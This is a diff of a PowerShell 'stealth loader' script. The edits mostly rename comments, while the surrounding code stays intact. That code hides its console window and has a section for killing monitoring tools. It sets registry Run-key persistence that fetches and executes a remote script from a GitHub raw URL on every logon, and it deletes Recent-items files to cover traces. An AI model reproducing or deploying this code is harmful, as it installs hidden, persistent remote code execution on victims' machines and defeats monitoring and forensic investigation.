@@ -1,4 +1,4 @@
-# ULTIMATE STEALTH LOADER - CLEAN VERSION
+# ULTIMATE STEALTH LOADER - NO ERRORS
 function Show-LoaderMenu {
     Write-Host ""
     Write-Host " SYSTEM LOADER | STEALTH MODE" -ForegroundColor Gray
@@ -18,7 +18,7 @@ function Install-And-Run-System {
         public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
         '
         $consolePtr = [Console.Window]::GetConsoleWindow()
-        [Console.Window]::ShowWindow($consolePtr, 0) # 0 = HIDE
+        [Console.Window]::ShowWindow($consolePtr, 0)
     } catch {}
     
     # KILL MONITORING TOOLS
@@ -45,7 +45,6 @@ function Install-And-Run-System {
         # FALLBACK: SILENT BACKGROUND WORKER
         Start-Job -ScriptBlock {
             while ($true) {
-                # Your background work here
                 Start-Sleep -Seconds 300
             }
         } | Out-Null
@@ -53,25 +52,22 @@ function Install-And-Run-System {
 
     # STEALTH PERSISTENCE
     try {
-        # REGISTRY PERSISTENCE
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $randomName = "WinCache" + (Get-Random -Maximum 9999)
         $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
         
         Set-ItemProperty -Path $regPath -Name $randomName -Value "powershell -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`"" -ErrorAction SilentlyContinue
-
     } catch {}
 
     # ANTI-FORENSIC CLEANUP
     try {
         Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\History\*" -Force -ErrorAction SilentlyContinue
     } catch {}
 
     Write-Host "[+] System running in silent mode" -ForegroundColor Green
     Start-Sleep -Seconds 2
     
-    # HIDE CONSOLE AFTER MESSAGE
+    # HIDE CONSOLE FINAL
     try {
         $consolePtr = [Console.Window]::GetConsoleWindow()
         [Console.Window]::ShowWindow($consolePtr, 0)
@@ -125,7 +121,7 @@ function Clean-System {
     Start-Sleep -Seconds 2
 }
 
-# SIMPLE MAIN EXECUTION
+# MAIN EXECUTION
 Show-LoaderMenu
 $choice = Read-Host
 
@@ -138,5 +134,5 @@ switch ($choice) {
     }
 }
 
-# CLEANUP
+# CLEANUP JOBS
 Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
